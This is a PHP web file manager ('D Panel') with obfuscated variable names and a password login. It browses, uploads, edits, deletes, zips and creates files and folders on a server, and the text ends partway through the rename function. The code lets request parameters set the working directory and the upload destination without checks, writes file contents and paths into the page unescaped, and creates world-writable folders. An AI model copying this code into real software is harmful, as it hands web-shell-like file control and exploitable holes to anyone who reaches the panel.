<?php 

session_start();
header("Cache-control: private");
include"pass.php";
$Ve0yv51w3usj=str_replace("/", "",$_SERVER['PHP_SELF']);
$Vzqn0xbmssad="pass.php";
@$Vbtiwmtugqik = $Vq0pzpaiuwjr;

$Vyemqnvlvf2w = "#bacaee";
$V5mh2z4qln2n = "#daeaff";
$Vbuurqzgdi1i = "#7080dd";
$Vhxdo43recwh = "#ffffff";
$Vaabpqhw3jgb = "#a6a6a6";
$Vsbbvok5zsni = "#003399";
$V0vlfueciojs = "#000000";
$Vlatyqpaciks = "#003399";
$Vfooltkokdmz="#99CC00";
if (!@$Vvk1v33ypzv2) $Vvk1v33ypzv2 = $Vyemqnvlvf2w;
if (!@$Vm5r2uencci0) $Vm5r2uencci0 = $V5mh2z4qln2n;
if (!@$Vfv2wtj2jzkt) $Vfv2wtj2jzkt = $Vbuurqzgdi1i;
if (!@$V40pm5kqe0co) $V40pm5kqe0co = $Vhxdo43recwh;
if (!@$Vkodlyuyrx23) $Vkodlyuyrx23 = $Vaabpqhw3jgb;
if (!@$Vovqy34uh5eg) $Vovqy34uh5eg = $Vsbbvok5zsni;
if (!@$Vhtkgbyqrytn) $Vhtkgbyqrytn = $V0vlfueciojs;
if (!@$Varf3naubbut) $Varf3naubbut = $Vlatyqpaciks;
if (!@$Vfooltkokdmz) $Vfooltkokdmz = $Vfooltkokdmz;



$Vwnjajrupcwx = "file/";
$Vr2dlypuv4mu = "file/";
$Vcytgghiywp0 = 'D Panel';
if(@$_GET['dir'])
	{   $V4prvkagdnq4=$_GET['dir'];
  		$Vwnjajrupcwx=$V4prvkagdnq4."";
	}
	

$Vopl2u1eoqpv=8;


if (@$_GET['action'] == 'logout') {
	$_SESSION = array();
	session_destroy();
	$_POST="";
}

$Vzwt3sbjbvas = true;
if (@$_POST['action'] == 'login') 
{
   $V0nqm0tgefnf = array('(' => '&#40;', ')' => '&#41;', '#' => '&#35;');
   $Vetq32h4yesz = strtr(htmlspecialchars(strip_tags($_POST['password'])), $V0nqm0tgefnf);
	if (($Vetq32h4yesz != $V1nugerjffkb) ) 
	{
		$Vefl4arvut0p = true;
	}
	 else 
	 {	
		$Vzwt3sbjbvas = false;
		$_SESSION['password'] = md5($Vetq32h4yesz);

	}

} else 
{
	
	if (($_SESSION['password'] == md5($V1nugerjffkb)))
	{
      $Vzwt3sbjbvas = false;
	}

}

if ($Vzwt3sbjbvas) {


?>
<!-- login page -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login Required</title>
<style type="text/css">
body, input {
	color: #000000;
	font: 12px arial, sans serif;
	background-color: #ffffff;
}
input {
	border: 1px solid #000000;
}
a {
	color: #666666;
	text-decoration: none;
}
a:hover {
	color: #333333;
}
h1 {
	font-size: 16px;
	letter-spacing: 1px;
}
p, h1 {
	margin: 10px 0px;
}
.errormsg {
	color: #FF0000;
}
</style>
</head>
<body>
<h1>Login Required</h1>
<form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
  <input type="hidden" name="action" value="login" />
  <?php

if ($Vefl4arvut0p) {
   echo '<p class="errormsg">Invalid login!  Try again.</p>';
}
?>
  <p> Password:<br />
    <input type="password" name="password" tabindex="0"  autofocus="autofocus"  draggable="true"/>
  </p>
  <p>
    <input type="submit" value="Submit" />
  </p>
</form>
</body>
</html>
<!-- login page ends -->
<?php


	exit;
}

 ?>
<?php
@$Vm3t3nwabn1h = $_REQUEST['op'];
@$Vh1wfqofbisd = $_REQUEST['folder'];
while (preg_match('/\.\.\//',$Vh1wfqofbisd)) $Vh1wfqofbisd = preg_replace('/\.\.\//','/',$Vh1wfqofbisd);
while (preg_match('/\/\//',$Vh1wfqofbisd)) $Vh1wfqofbisd = preg_replace('/\/\//','/',$Vh1wfqofbisd);

if ($Vh1wfqofbisd == '') {
  $Vh1wfqofbisd = $Vwnjajrupcwx;
} elseif ($Vwnjajrupcwx != '') {
  if (!@ereg($Vwnjajrupcwx,$Vh1wfqofbisd)) {
    $Vh1wfqofbisd = $Vwnjajrupcwx;
  }  
}








function maintop($Vd4lumojyf1d,$Vfltrutmvoib = true) {
  global $Vcytgghiywp0, $Vjqo5dlmrgov, $Vei00inxsvnl, $V0lujlxjsppq, $Vfooltkokdmz, $Ve0nkopt3bwa, $V40pm5kqe0co, $Vkodlyuyrx23, $Vovqy34uh5eg, $Vhtkgbyqrytn, $Varf3naubbut, $Vuijutgyg4lx, $V3mpun2r3qpl, $Vetq32h4yesz, $V2rsu4pswbim, $Vph5qubusja4;
  echo "<!DOCTYPE html>\n"
  ."<html lang=\"en\">\n"
."<head>"
    ."<meta charset=\"utf-8\">\n"
    ."<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n"
    ."<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n"
      ."<title>$Vcytgghiywp0 :: $Vd4lumojyf1d</title>\n"
      ."</head>\n"
      ."<body bgcolor=\"#ffffff\">\n"
      ."<style>\n"
	  .".menu2 {"
	."background-color: #009900;"
	."color:#FF0000;"
	."}"
	
	.".table {"
	."}"
	  .".submit {"
		."width : 115px;"
	."height :25px;"
	."border : medium 1px;"
	."color:#FF0000;}"
	.".del {"
	."background : url(\"iconsss/delete.png\") no-repeat center center;background-size:100% 100%;"
	."width : 15px;"
	."height :auto;"
	."border : none;"
	."font-size:10px;"
	."color : transparent;}"
	.".zip {"
	."background : url(\"iconsss/zip.png\") no-repeat center center;background-size:100% 100%;"
	."width : 15px;"
	."height :auto;"
	."border : none;"
	."color : transparent;}"
	.".uzip {"
	."background : url(\"iconsss/uzip.png\") no-repeat center center;background-size:100% 100%;"
	."width : 15px;"
	."height :auto;"
	."border : none;"
	."color : transparent;}"
	.".mov {"
	."background : url(\"iconsss/move_to_folder.png\") no-repeat center center;background-size:100% 100%;"
	."width : 15px;"
	."height :auto;"
	."border : none;"
	."color : transparent;}"
."a:link {color:#000000;font-family:Georgia;}      /* unvisited link */"
."a:visited {color:#000000;font-family:Georgia;}  /* visited link */"
."a:hover {color:#000000;font-family:Georgia;}  /* mouse over link */"
."a:active {color:#000000;font-family:Georgia;}"

      ."td {color: $Vhtkgbyqrytn;
	  white-space: nowrap;}\n"
	  .".iconsss { width:15px; height:auto}\n"
      ."BODY {font-size : 70%; MARGIN: 0px 0px 0px; BACKGROUND-COLOR: $V40pm5kqe0co}\n"
      .".error {font-family:Georgia; COLOR: #AA2222; TEXT-ALIGN: left}\n"
      ."</style>\n\n";

  if ($V0lujlxjsppq == "") {
    echo ""
        ."<center><table cellpadding=1 cellspacing=1  bgcolor=silver width=500><tr><td>\n"
        ."<table align=left><tr><td>\n";
  } else {
    echo "<table cellpadding=7 cellspacing=7><tr><td>\n";
  }

  echo "<table  border=\"0\" cellpadding=\"2\" cellspacing=\"0\"  bgcolor=\"".$Vfooltkokdmz."\">\n"
  ."<tr><td align=\"left\" >Welcome :: ".@$_SESSION["user"]."</td></tr>\n"
  
      ."<tr><td align=\"left\">$Vcytgghiywp0 :: $Vd4lumojyf1d</td></tr>\n"
      ."<tr><td width=650 style=\"height: 1px;\" bgcolor=\"black\"></td></tr>\n";

  if ($Vfltrutmvoib) {
  global $Vwnjajrupcwx;
    echo "<tr><td>\n"
        ."<a href=\"".@$Vbtiwmtugqik."?op=home\" $Ve0nkopt3bwa>Home</a>\n"
        ."<a href=\"".@$Vbtiwmtugqik."?op=up&dir=".$Vwnjajrupcwx."\" $Ve0nkopt3bwa>Upload</a>\n"
        ."<a href=\"".@$Vbtiwmtugqik."?op=cr&dir=".$Vwnjajrupcwx."\" $Ve0nkopt3bwa>Create</a>\n"
		."<a href=\"".@$Vbtiwmtugqik."?op=unzip&dir=".$Vwnjajrupcwx."\" $Ve0nkopt3bwa>unzip</a>\n"
		."<a href=\"".@$Vbtiwmtugqik."?op=pass&dir=".$Vwnjajrupcwx."\" $Ve0nkopt3bwa>Password</a>\n"
		."<a href=\"".@$Vbtiwmtugqik."?op=&action=logout&dir=".$Vwnjajrupcwx."\" $Ve0nkopt3bwa>Logout</a>\n";
	
 }
  echo "</table><hr>\n";
}












function mime_content_typess($Ve0yv51w3usj) {

@$V0hutix3p1mu = pathinfo($Ve0yv51w3usj);

if(@$V0hutix3p1mu['extension']=="png")
{
$V33z3gkvvzg0='<img src="iconsss/png.png"  alt="png" class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="gif")
{
$V33z3gkvvzg0='<img src="iconsss/gif.png"  alt=gif" class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="jpg")
{
$V33z3gkvvzg0='<img src="iconsss/jpg.png"  alt="jpg" class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="js")
{
$V33z3gkvvzg0='<img src="iconsss/js.png"  alt="js"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="db")
{
$V33z3gkvvzg0='<img src="iconsss/db.png"  alt="db"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="ico")
{
$V33z3gkvvzg0='<img src="iconsss/ico.png"  alt="ico"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="css")
{
$V33z3gkvvzg0='<img src="iconsss/css.png"  alt="css"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="php")
{
$V33z3gkvvzg0='<img src="iconsss/php.png"  alt="php"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="txt")
{
$V33z3gkvvzg0='<img src="iconsss/txt.png"  alt="txt"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="htm" || @$V0hutix3p1mu['extension']=="html")
{
$V33z3gkvvzg0='<img src="iconsss/html.png"  alt="html"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="zip")
{
$V33z3gkvvzg0='<img src="iconsss/zip.png"  alt="zip"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="rar")
{
$V33z3gkvvzg0='<img src="iconsss/rar.png"  alt="zip"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="htaccess")
{
$V33z3gkvvzg0='<img src="iconsss/htaccess.png"  alt="zip"class="iconsss">';
return $V33z3gkvvzg0;
}
if(@$V0hutix3p1mu['extension']=="pdf")
{
$V33z3gkvvzg0='<img src="iconsss/pdf.png"  alt="zip"class="iconsss">';
return $V33z3gkvvzg0;
}
return '<img src="iconsss/unn.png"  alt="zip"class="iconsss">';
    }

	
function home() {
  global $Vh1wfqofbisd, $Vvk1v33ypzv2, $Vm5r2uencci0, $Vfv2wtj2jzkt, $Vwnjajrupcwx, $Vbtiwmtugqik, $Vnwchvuthuva, $Ve0yv51w3usj, $Vzqn0xbmssad;
  
  maintop("Home");
  echo ""
      ."<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=100%>\n";

  $Vlxpqeeuvjm2 = "";
  $V0n12oa0kmxp = "";

 
  $Vv1hajbmls5v = "0";
  $Vav1bwizsv5e = opendir($Vh1wfqofbisd);
  $Vx4seocgmigk=1;
  $Vzg10eyw5ixh=1;

  if ($Vh1wfqofbisd) {
    if (@ereg("/home/",$Vh1wfqofbisd)) {
      $Vh1wfqofbisdx = ereg_replace("$Vwnjajrupcwx", "", $Vh1wfqofbisd);
      $Vh1wfqofbisdx = "http://".$Vnwchvuthuva."/".$Vh1wfqofbisdx;
    } else {
      $Vh1wfqofbisdx = $Vh1wfqofbisd;
    } 
  }

  while($Vav1bwizsv5esheet = readdir($Vav1bwizsv5e)) {
    if (strlen($Vav1bwizsv5esheet)>20) { 
      $V3vyrh1rjvy5 = substr($Vav1bwizsv5esheet,0,20)."...";
    } else {
      $V3vyrh1rjvy5 = $Vav1bwizsv5esheet;
    }
    if (($Vav1bwizsv5esheet != ".") && ($Vav1bwizsv5esheet != "..") && ($Vav1bwizsv5esheet !=$Ve0yv51w3usj) && ($Vav1bwizsv5esheet !=$Vzqn0xbmssad)) {
	
      if (is_dir($Vh1wfqofbisd.$Vav1bwizsv5esheet) && is_readable($Vh1wfqofbisd.$Vav1bwizsv5esheet)) { 
	  
        $Vlxpqeeuvjm2[$Vx4seocgmigk] ="<td><input type=\"checkbox\" id=\"coffee\" name=\"coffeee[]\" value=\"".$Vh1wfqofbisdx.$Vav1bwizsv5esheet."\"><a href=\"".@$Vbtiwmtugqik."?op=home&folder=".$Vh1wfqofbisd.$Vav1bwizsv5esheet."/\"><img src=iconsss/folder.png  alt=Open class=\"iconsss\">".$V3vyrh1rjvy5."</a></td>\n"
                 ."<td> "
                
				 
                 ."<td align=\"center\"><a href=\"".@$Vbtiwmtugqik."?op=home&folder=".$Vh1wfqofbisd.$Vav1bwizsv5esheet."/\"><img src=\"iconsss/folders_explorer.png\"  alt=\"Open\"class=\"iconsss\"></a>\n"
                 ."<td align=\"center\"><a href=\"".@$Vbtiwmtugqik."?op=ren&file=".$Vav1bwizsv5esheet."&folder=$Vh1wfqofbisd\"><img src=\"iconsss/folder_edit.png\"  alt=\"Rename\"class=\"iconsss\"></a>\n"
				  ."<td align=\"center\">\n"
                 ."<td align=\"center\"><a href=\"".@$Vbtiwmtugqik."?op=del&dename=".$Vav1bwizsv5esheet."&folder=$Vh1wfqofbisd\"><img src=\"iconsss/folder_delete.png\"  alt=\"Delete\"class=\"iconsss\"></a>\n"
                 ."<td align=\"left\"><input type=\"checkbox\" id=\"movee\" name=\"moveee[]\" value=\"".$Vav1bwizsv5esheet."\"><input type=\"submit\" value=\"Upload\" class=\"mov\" onClick=\"javascript: form.action='?op=mov&dir=".$Vwnjajrupcwx."';\">\n"
				 
				 ."<td align=\"left\"><input type=\"checkbox\" id=\"zipee\" name=\"zipeee[]\" value=\"".$Vav1bwizsv5esheet."\">\n"
				 ."<td align=\"left\"><input type=\"checkbox\" id=\"zipeech\" name=\"zipeeech[]\" value=\"".$Vav1bwizsv5esheet."\">\n"
                 ."<td align=\"center\"> <tr height=\"2\"><td height=\"2\" colspan=\"3\">\n";
        $Vx4seocgmigk++;
      } elseif (!is_dir($Vh1wfqofbisd.$Vav1bwizsv5esheet) && is_readable($Vh1wfqofbisd.$Vav1bwizsv5esheet)) { 
	  
        $V0n12oa0kmxp[$Vzg10eyw5ixh] ="<td><input type=\"checkbox\" id=\"coffee\" name=\"coffeee[]\" value=\"".$Vh1wfqofbisdx.$Vav1bwizsv5esheet."\">".mime_content_typess($Vh1wfqofbisdx.$Vav1bwizsv5esheet)."<a href=\"".$Vh1wfqofbisdx.$Vav1bwizsv5esheet."\">".$V3vyrh1rjvy5."</a></td>\n"                
				 ."<td align=\"left\">".filesize($Vh1wfqofbisd.$Vav1bwizsv5esheet)
                 ."<td align=\"center\"><a href=\"".@$Vbtiwmtugqik."?op=edit&fename=".$Vav1bwizsv5esheet."&folder=$Vh1wfqofbisd\"><img src=\"iconsss/page_edit.png\"  alt=\"Edit\"class=\"iconsss\"></a>\n"
                 ."<td align=\"center\"><a href=\"".@$Vbtiwmtugqik."?op=ren&file=".$Vav1bwizsv5esheet."&folder=$Vh1wfqofbisd\"><img src=\"iconsss/folder_edit.png\"  alt=\"Rename\"class=\"iconsss\"></a>\n"
				 ."<td align=\"center\"><a href=\"".@$Vbtiwmtugqik."?op=viewframe&file=".$Vav1bwizsv5esheet."&folder=$Vh1wfqofbisd\"><img src=\"iconsss/zoom.png\"  alt=\"View\"class=\"iconsss\"></a>\n"
                 ."<td align=\"center\"><a href=\"".@$Vbtiwmtugqik."?op=del&dename=".$Vav1bwizsv5esheet."&folder=$Vh1wfqofbisd\"><img src=\"iconsss/newspaper_delete.png\"  alt=\"Delete\" class=\"iconsss\"></a>\n"
                 ."<td align=\"left\"><input type=\"checkbox\" id=\"movee\" name=\"moveee[]\" value=\"".$Vav1bwizsv5esheet."\"><input type=\"submit\" value=\"Upload\" class=\"mov\" onClick=\"javascript: form.action='?op=mov&dir=".$Vwnjajrupcwx."';\">\n"
                 
				 ."<td align=\"left\"><input type=\"checkbox\" id=\"zipee\" name=\"zipeee[]\" value=\"".$Vav1bwizsv5esheet."\">\n"
				 ."<td align=\"left\"><input type=\"checkbox\" id=\"zipeech\" name=\"zipeeech[]\" value=\"".$Vav1bwizsv5esheet."\">\n"
                 ."<tr height=\"2\"><td height=\"2\" colspan=\"3\">\n";
        $Vzg10eyw5ixh++;
      } else {
        echo "Directory is unreadable\n";
      }
    $Vv1hajbmls5v++;
    } 
  }
  closedir($Vav1bwizsv5e);
  echo "<form METHOD=\"POST\"><input type=\"submit\" value=\"del\" alt=\"del\" title=\"del\" class=\"del\" onClick=\"javascript: form.action='?op=delall';\">&nbsp;<input type=\"submit\" value=\"uzip\" class=\"uzip\" alt=\"uzip\" title=\"uzip\" onClick=\"javascript: form.action='?op=unzip&dir=".$Vwnjajrupcwx."';\">&nbsp;<input type=\"submit\" value=\"zip\" class=\"zip\" alt=\"zip\" title=\"zip\" onClick=\"javascript: form.action='?op=zip&dir=".$Vwnjajrupcwx."';\">&nbsp;<input type=\"submit\" value=\"mov\" class=\"mov\" alt=\"mov\" title=\"mov\" onClick=\"javascript: form.action='?op=mov&dir=".$Vwnjajrupcwx."';\"><br><input type=\"hidden\" name=\"all\" value=\"1\" /><hr>";
echo"Browsing: ";

      $Vzg10eyw5ixhc = new breadcrumbs;


$Vzg10eyw5ixhc->setPointer('->');


$Vzg10eyw5ixhc->crumbs();


echo $Vzg10eyw5ixhc->breadcrumbs;
	   echo "<br>Number of Files: " . $Vv1hajbmls5v . "<hr>";
  
	   
  echo "<tr bgcolor=\"$Vfv2wtj2jzkt\">"
      ."<td width=390><input type=\"checkbox\" onclick=\"check(this.value)\" value=\"ch\" id=\"allcecked\"/>Filename\n"
      ."<td width=20>Size\n"
      ."<td align=\"center\" width=20>Ope\n"
      ."<td align=\"center\" width=48>Ren\n"
	  ."<td align=\"center\" width=44>Vie\n"
      ."<td align=\"center\" width=47>Del\n"
      ."<td align=\"left\" width=90px><input type=\"checkbox\" onclick=\"checkmo(this.value)\" value=\"ch\" id=\"allceckedmove\"/>Mov\n"
      ."<td align=\"left\" width=64><input type=\"checkbox\" onclick=\"checkzip(this.value)\" value=\"ch\" id=\"allceckedzip\"/>Zip\n"
	  ."<td align=\"left\" width=84><input type=\"checkbox\" onclick=\"chmodss(this.value)\" value=\"ch\" id=\"allceckedchmod\"/>Chm\n"
      ."<tr><td>\n";

  for ($Vx4seocgmigk=1; $Vx4seocgmigk<count($Vlxpqeeuvjm2)+1;$Vx4seocgmigk++) {
    $V554g3ahieqq   = ($Vx4seocgmigk % 2) ? $Vvk1v33ypzv2 : $Vm5r2uencci0;
    echo "<tr bgcolor=".$V554g3ahieqq." width=100%>";
    echo @$Vlxpqeeuvjm2[$Vx4seocgmigk];
  }

  for ($Vzg10eyw5ixh=1; $Vzg10eyw5ixh<count($V0n12oa0kmxp)+1;$Vzg10eyw5ixh++) {
    $V554g3ahieqq   = ($Vx4seocgmigk++ % 2) ? $Vvk1v33ypzv2 : $Vm5r2uencci0;
    echo "<tr bgcolor=".$V554g3ahieqq." width=100%>";
    echo @$V0n12oa0kmxp[$Vzg10eyw5ixh];
  }

  echo"</table>";
  mainbottom();
}








function up() {
  global $Vr2dlypuv4mu, $Vh1wfqofbisd, $V2uv11mkpnb4, $Vwnjajrupcwx ,$Vopl2u1eoqpv ,$Vwnjajrupcwx;
  maintop("Upload");

  echo "<FORM ENCTYPE=\"multipart/form-data\" ACTION=\"".@$Vbtiwmtugqik."?op=upload&dir=".$Vwnjajrupcwx."\" METHOD=\"POST\">\n";
      
 for($Vv3ds52jsmyn=1; $Vv3ds52jsmyn<=$Vopl2u1eoqpv; $Vv3ds52jsmyn++){

echo "<input type=file name='upfile[]' class='bginput'><br>";
}
       echo "<br><br>Destination:<br><select name=\"ndir\" size=1>\n"
      ."<option value=\"".$Vr2dlypuv4mu."\">".$Vr2dlypuv4mu."</option>";
  listdir($Vr2dlypuv4mu);
  echo $V2uv11mkpnb4
      ."</select><br><br>"

      ."<input type=\"submit\" value=\"Upload\" class=\"submit\">\n"
      ."</form>\n";

  mainbottom();
}









function upload($Vtghyz0flwz2, $Vch4n0nxvmqw) {

  global $Vh1wfqofbisd;
  maintop("Upload");
  while(list($Vjmybvoqhvi1,$V13e5whyew0u) = @each($_FILES['upfile']['name']))
{
if(!empty($V13e5whyew0u)){   

$Ve0yv51w3usj =$V13e5whyew0u;


$Vx4seocgmigkdd = $_REQUEST['ndir']."/$Ve0yv51w3usj";   


copy($_FILES['upfile']['tmp_name'][$Vjmybvoqhvi1], $Vx4seocgmigkdd); 
echo $Vx4seocgmigkdd;

    

}
}
    

  mainbottom();
}















function del($V4fom0sozrw0) {
  global $Vh1wfqofbisd;
    if (!$V4fom0sozrw0 == "") {
    maintop("Delete");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."<font class=error>**WARNING: This will permanatly delete ".$Vh1wfqofbisd.$V4fom0sozrw0.". This action is irreversable.**</font><br><br>\n"
        ."Are you sure you want to delete ".$Vh1wfqofbisd.$V4fom0sozrw0."?<br><br>\n"
        ."<a href=\"".@$Vbtiwmtugqik."?op=delete&dename=".$V4fom0sozrw0."&folder=$Vh1wfqofbisd\">Yes</a> | \n"
        ."<a href=\"".@$Vbtiwmtugqik."?op=home\"> No </a>\n"
        ."</table>\n";
		
    mainbottom();
  } else {
    home();
  }
}

function deleteDirectory($V4prvkagdnq4) {
if (!file_exists($V4prvkagdnq4)) return true;
if (!is_dir($V4prvkagdnq4)) return unlink($V4prvkagdnq4);

foreach (scandir($V4prvkagdnq4) as $Vv3ds52jsmyntem) {
if ($Vv3ds52jsmyntem == '.' || $Vv3ds52jsmyntem == '..') continue;
if (!deleteDirectory($V4prvkagdnq4.DIRECTORY_SEPARATOR.$Vv3ds52jsmyntem)) return false;
}
return rmdir($V4prvkagdnq4);
}




function delal() {
  global $Vh1wfqofbisd;
    if ($_REQUEST['all'] == "1") {
    maintop("All Delete ");
    
		if(@$_POST['coffeee']){
$Vzfedfchezv4 = $_POST['coffeee'];
for($Vv3ds52jsmyn=0; $Vv3ds52jsmyn<sizeof($Vzfedfchezv4); $Vv3ds52jsmyn++){
echo $Vzfedfchezv4[$Vv3ds52jsmyn]."<br>";
deleteDirectory($Vzfedfchezv4[$Vv3ds52jsmyn]);
echo "   your file deleted";
}
}
    mainbottom();
  } else {
    home();
  }
}











function delete($V4fom0sozrw0) {
  global $Vh1wfqofbisd;
  if (!$V4fom0sozrw0 == "") {
    maintop("Delete");
    if (is_dir($Vh1wfqofbisd.$V4fom0sozrw0)) {
      if(rmdir($Vh1wfqofbisd.$V4fom0sozrw0)) {
        echo $V4fom0sozrw0." has been deleted.";
      } else {
        echo "There was a problem deleting this directory. ";
      }
    } else {
      if(unlink($Vh1wfqofbisd.$V4fom0sozrw0)) {
        echo $V4fom0sozrw0." has been deleted.";
      } else {
        echo "There was a problem deleting this file. ";
      }
    }
    mainbottom();
  } else {
    home();
  }
}









function edit($Vgqml4uvokz0) {
  global $Vh1wfqofbisd,$Ve0yv51w3usj;
  if (!$Vgqml4uvokz0 == "" && $Vgqml4uvokz0!=$Ve0yv51w3usj) {
    maintop("Edit");
    echo $Vh1wfqofbisd.$Vgqml4uvokz0;

    echo "<br><form action=\"".@$Vbtiwmtugqik."?op=save\" method=\"post\">\n"
	."<input type=\"submit\" value=\"Edit\" class=\"button\" class=\"submit\"><br>\n"
        ."<textarea cols=\"73\" rows=\"40\" name=\"ncontent\">\n";

   $Vl2j2ecdnjrw = fopen ($Vh1wfqofbisd.$Vgqml4uvokz0, "r");
   $V2uv11mkpnb4s = "";

    while (@$Vvuyclibv3ij<1) {
      $V3w2idci0zj2 = @fread ($Vl2j2ecdnjrw, filesize ($Vh1wfqofbisd.$Vgqml4uvokz0));
      if (strlen($V3w2idci0zj2) == 0) {
        break;
      }
      $V2uv11mkpnb4s .= $V3w2idci0zj2;
    }
    fclose ($Vl2j2ecdnjrw);

    $V0nqm0tgefnf1 = "</text";
    $V0nqm0tgefnf2 = "area>";
    $V0nqm0tgefnf3 = "< / text";
    $V0nqm0tgefnf4 = "area>";
    $V0nqm0tgefnfa = $V0nqm0tgefnf1.$V0nqm0tgefnf2;
    $V0nqm0tgefnfb = $V0nqm0tgefnf3.$V0nqm0tgefnf4;
    $V2uv11mkpnb4s = @ereg_replace ($V0nqm0tgefnfa,$V0nqm0tgefnfb,$V2uv11mkpnb4s);

    echo $V2uv11mkpnb4s;

    echo "</textarea>\n"
        ."<br><br>\n"
        ."<input type=\"hidden\" name=\"folder\" value=\"".$Vh1wfqofbisd."\">\n"
        ."<input type=\"hidden\" name=\"fename\" value=\"".$Vgqml4uvokz0."\">\n"
        ."<input type=\"submit\" value=\"Edit\" class=\"button\" class=\"submit\">\n"
        ."</form>\n";
    mainbottom();
  } else {
    home();
  }
}









function save($Vruchplkpanb, $Vgqml4uvokz0) {
  global $Vh1wfqofbisd;
  if (!$Vgqml4uvokz0 == "") {
    maintop("Edit");
    $Vz354l0rh54h = $Vh1wfqofbisd.$Vgqml4uvokz0;
    $Vmwswj5nce5o = fopen($Vz354l0rh54h, "w");

    $V0nqm0tgefnf1 = "</text";
    $V0nqm0tgefnf2 = "area>";
    $V0nqm0tgefnf3 = "< / text";
    $V0nqm0tgefnf4 = "area>";
    $V0nqm0tgefnfa = $V0nqm0tgefnf1.$V0nqm0tgefnf2;
    $V0nqm0tgefnfb = $V0nqm0tgefnf3.$V0nqm0tgefnf4;
	
    $Vruchplkpanb = @ereg_replace ($V0nqm0tgefnfb,$V0nqm0tgefnfa,$Vruchplkpanb);

    $Vynpfwmv3l4h = $Vruchplkpanb;

    if(fwrite($Vmwswj5nce5o, $Vynpfwmv3l4h)) {
      echo "The file <a href=\"".@$Vbtiwmtugqik."?op=viewframe&file=".$Vgqml4uvokz0."&folder=".$Vh1wfqofbisd."\">".$Vh1wfqofbisd.$Vgqml4uvokz0."</a> was succesfully edited\n";
      $Vmwswj5nce5o = null;
    } else {
      echo "There was a problem editing this file\n";
    }
    mainbottom();
  } else {
    home();
  }
}








function cr() {
  global $Vr2dlypuv4mu,$Vh1wfqofbisd, $V2uv11mkpnb4, $Vwnjajrupcwx;
  maintop("Create");
  if (!$V2uv11mkpnb4 == "") { echo "<br><br>Please enter a filename.\n"; }
  echo "<form action=\"".@$Vbtiwmtugqik."?op=create\" method=\"post\">\n"
      ."Filename: <br><input type=\"text\" size=\"20\" name=\"nfname\" class=\"text\"><br><br>\n"
   
      ."Destination:<br><select name=ndir size=1>\n"
      ."<option value=\"".$Vr2dlypuv4mu."\">".$Vr2dlypuv4mu."</option>";
  listdir($Vr2dlypuv4mu);
  echo $V2uv11mkpnb4
      ."</select><br><br>";


  echo "File <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"0\" checked><br>\n"
      ."Directory <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"1\"><br><br>\n"
      ."<input type=\"hidden\" name=\"folder\" value=\"$Vh1wfqofbisd\">\n"
      ."<input type=\"submit\" value=\"Create\" class=\"submit\">\n"
      ."</form>\n";
  mainbottom();
}










function create($Vdqfxcbfqhl4, $Vv3ds52jsmynsfolder, $Vch4n0nxvmqw) {
  global $Vh1wfqofbisd,$Vbtiwmtugqik;
  if (!$Vdqfxcbfqhl4 == "") {
    maintop("Create");

    if ($Vv3ds52jsmynsfolder == 1) {
      if(mkdir($Vch4n0nxvmqw."/".$Vdqfxcbfqhl4, 0777)) {
        echo "Your directory, <a href=\"".@$Vbtiwmtugqik."?op=viewframe&file=".$Vdqfxcbfqhl4."&folder=$Vch4n0nxvmqw\">".$Vch4n0nxvmqw."/".$Vdqfxcbfqhl4."</a> was succesfully created.\n";
      } else {
        echo "The directory, ".$Vch4n0nxvmqw."/".$Vdqfxcbfqhl4." could not be created. Check to make sure the permisions on the /files directory is set to 777\n";
      }
    } else {
      if(fopen($Vch4n0nxvmqw."/".$Vdqfxcbfqhl4, "w")) {
        echo "Your file, <a href=\"".$Vbtiwmtugqik."?op=viewframe&file=".$Vdqfxcbfqhl4."&folder=$Vch4n0nxvmqw\">".$Vch4n0nxvmqw.$Vdqfxcbfqhl4."</a> was succesfully created.\n";
      } else {
        echo "The file, ".$Vch4n0nxvmqw."/".$Vdqfxcbfqhl4." could not be created. Check to make sure the permisions on the /files directory is set to 777\n";
      }
    }
    mainbottom();
  } else {
    cr();
  }
}









function ren($Vmtjosntglqr) {
  global $Vh1wfqofbisd;
  if (!$Vmtjosntglqr == "") {
    maintop("Rename");
    echo "<form action=\"".@$Vbtiwmtugqik."?op=rename\" method=\"post\">\n"
        ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."Renaming ".$Vh1wfqofbisd.$Vmtjosntglqr;

    echo "</table><br>\n"
        ."<input type=\"hidden\" name=\"rename\" value=\"".$Vmtjosntglqr."\">\n"
        ."<input type=\"hidden\" name=\"folder\" value=\"".$Vh1wfqofbisd."\">\n"
        ."New Name:<br><input class=\"text\" type=\"text\" size=\"20\" name=\"nrename\">\n"
        ."<input type=\"Submit\" value=\"Rename\" class=\"submit\">\n";
    mainbottom();
  } else {
    home();
  }
}










function renam($Vnjbfyut5zad, $Vfocwlj0ueb4, $Vh1wfqofbisd) {
  global $Vh1wfqofbisd;
  if (!$Vnjbfyut5zad == "") {
    maintop("Rename");
